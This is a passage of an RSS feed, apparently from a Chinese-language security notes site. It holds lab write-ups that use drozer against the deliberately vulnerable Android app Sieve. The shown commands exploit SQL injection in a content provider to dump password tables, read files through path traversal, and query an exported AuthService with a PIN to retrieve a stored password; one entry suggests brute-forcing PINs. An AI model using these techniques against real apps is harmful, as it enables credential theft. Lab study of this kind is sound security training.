+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Exception occured: unrecognized token: &lt;span style="color:#e6db74">&amp;#34;&amp;#39;)&amp;#34;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>code &lt;span style="color:#ae81ff">1&lt;/span> SQLITE_ERROR&lt;span style="color:#f92672">)&lt;/span>: , &lt;span style="color:#66d9ef">while&lt;/span> compiling: SELECT * FROM Passwords WHERE &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection &amp;#34;* FROM SQLITE_MASTER WHERE type=&amp;#39;&lt;/span>table&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>;--&lt;span style="color:#e6db74">&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">Attempting to run shell module
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| type | name | tbl_name | rootpage | sql |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | Passwords | Passwords | 4 | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | Key | Key | 5 | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>我們也可以用drozer自動幫我們找
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.injection -a com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not Vulnerable:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Projection:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Selection:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.sqltables -a com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://com.mwr.example.sieve.DBContentProvider/Passwords:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Passwords
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Key
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://com.mwr.example.sieve.DBContentProvider/Keys/:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Passwords
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Key
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://com.mwr.example.sieve.DBContentProvider/Passwords/:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Passwords
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Key
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol></description></item><item><title>Test Sieve - content providers exported - File SystemBased</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/</guid><description>&lt;h1 id="test-sieve---content-providers-exported---file-systembased">
+ Test Sieve - content providers exported - File SystemBased
+ &lt;a class="anchor" href="#test-sieve---content-providers-exported---file-systembased">#&lt;/a>
+&lt;/h1>
+&lt;ol>
+&lt;li>有關於基於File System的Content Provider - 逆向
+在&lt;code>com.mwr.example.sieve.FileBackupProvider&lt;/code>中可以特別注意onCreate以及ParcelFileDescriptor這個funnction
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FileBackupProvider&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> ContentProvider {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.ContentProvider&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">onCreate&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">sUriMatcher&lt;/span>.&lt;span style="color:#a6e22e">addURI&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.FileBackupProvider&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>, DATABASE);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.ContentProvider&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> ParcelFileDescriptor &lt;span style="color:#a6e22e">openFile&lt;/span>(Uri uri, String mode) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> modeCode;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (mode.&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> modeCode &lt;span style="color:#f92672">=&lt;/span> 268435456;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (mode.&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;rw&amp;#34;&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> modeCode &lt;span style="color:#f92672">=&lt;/span> 805306368;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (mode.&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;rwt&amp;#34;&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> modeCode &lt;span style="color:#f92672">=&lt;/span> 805306368;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Log.&lt;span style="color:#a6e22e">w&lt;/span>(TAG, &lt;span style="color:#e6db74">&amp;#34;Unrecognised code to open file: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> mode);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ParcelFileDescriptor.&lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> File(uri.&lt;span style="color:#a6e22e">getPath&lt;/span>()), modeCode);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (FileNotFoundException e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Log.&lt;span style="color:#a6e22e">e&lt;/span>(TAG, &lt;span style="color:#e6db74">&amp;#34;ERROR: unable to open file: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> e.&lt;span style="color:#a6e22e">getMessage&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>實際讀取文件或是Path Traversal
+為了測試他真的能夠讀取到特定文件，我在手機的Download創了一個secret.txt，不管是哪一個file，都可以正常讀取
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;this is secret file&amp;#34;&lt;/span> &amp;gt; /storage/emulated/0/Download/secret.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/storage/emulated/0/Download/secret.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>this is secret file
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>127.0.0.1 localhost
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>::1 ip6-localhost
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>也可以利用drozer自動找尋path traversal的漏洞在哪裡
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.traversal -a com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not Vulnerable:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Vulnerable Providers:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></description></item><item><title>Test Sieve - is debuggable</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/</guid><description>&lt;h1 id="test-sieve---is-debuggable">
+ Test Sieve - is debuggable
+ &lt;a class="anchor" href="#test-sieve---is-debuggable">#&lt;/a>
+&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.debuggable
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: org.owasp.goatdroid.fourgoats
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10286&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10285&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.withsecure.dz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10284&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10282&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Test Sieve - services exported</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/</guid><description>&lt;h1 id="test-sieve---services-exported">
+ Test Sieve - services exported
+ &lt;a class="anchor" href="#test-sieve---services-exported">#&lt;/a>
+&lt;/h1>
+&lt;ol>
+&lt;li>列出exported services有哪些
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.service.info -a com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.AuthService
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.CryptoService
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>逆向
+從以上可以知道有兩個service是被export的，這樣的話就可以逆一下判斷可以送出什麼東西以及可能的漏洞在哪，按照教學的說明我直接看==AuthService==這個service，
+在&lt;code>com.mwr.example.sieve.AuthService&lt;/code>中的其中一段就是有問題的地方:
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">AuthService&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Service {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MessageHandler&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Handler {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">handleMessage&lt;/span>(Message msg) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (msg.&lt;span style="color:#a6e22e">what&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> 4:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> AuthService.&lt;span style="color:#a6e22e">MSG_CHECK&lt;/span> &lt;span style="color:#75715e">/* 2354 */&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (msg.&lt;span style="color:#a6e22e">arg1&lt;/span> &lt;span style="color:#f92672">==&lt;/span> AuthService.&lt;span style="color:#a6e22e">TYPE_KEY&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> responseCode3 &lt;span style="color:#f92672">=&lt;/span> 42;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String recievedString &lt;span style="color:#f92672">=&lt;/span> returnBundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.PASSWORD&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">verifyKey&lt;/span>(recievedString)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">showNotification&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 0;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 1;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (msg.&lt;span style="color:#a6e22e">arg1&lt;/span> &lt;span style="color:#f92672">==&lt;/span> AuthService.&lt;span style="color:#a6e22e">TYPE_PIN&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> responseCode3 &lt;span style="color:#f92672">=&lt;/span> 41;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String recievedString2 &lt;span style="color:#f92672">=&lt;/span> returnBundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.PIN&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">verifyPin&lt;/span>(recievedString2)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnBundle &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Bundle();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnBundle.&lt;span style="color:#a6e22e">putString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.PASSWORD&amp;#34;&lt;/span>, AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">getKey&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 0;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 1;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sendUnrecognisedMessage();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sendResponseMessage(5, responseCode3, returnVal2, returnBundle);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先在msg.what=2354且msg.arg1=AuthService.TYPE_PIN的地方，若程式讀取到的&lt;code>com.mwr.example.sieve.PIN&lt;/code>的value(也就是PIN Code)，經過verifyPin這個function比對過後一致，則他會return一個bundle，內涵&lt;code>com.mwr.example.sieve.PASSWORD&lt;/code>以及我們之前設定的password，並且回傳response message給我們
+→[5, 41, 0, {com.mwr.example.sieve.PASSWORD:&amp;lt;password&amp;gt;}]
+而這個問題在哪裡呢?經過前期的確認以及逆向，我們可以寫個script爆破，不斷送出一些pin code給這個service，則因為大多時候PIN Code的複雜度比較低，所以總有一天可以得到使用者的密碼了&lt;/li>
+&lt;li>和service互動
+從下面的結果來看，一開始設定的密碼為==123456acitseccom==
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg &lt;span style="color:#ae81ff">2354&lt;/span> &lt;span style="color:#ae81ff">9234&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> --extra string com.mwr.example.sieve.PIN &amp;lt;User PIN&amp;gt; --bundle-as-obj
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> what: &lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg1: &lt;span style="color:#ae81ff">41&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg2: &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Extras
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.PASSWORD &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">)&lt;/span> : 123456acitseccom
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></description></item></channel></rss>
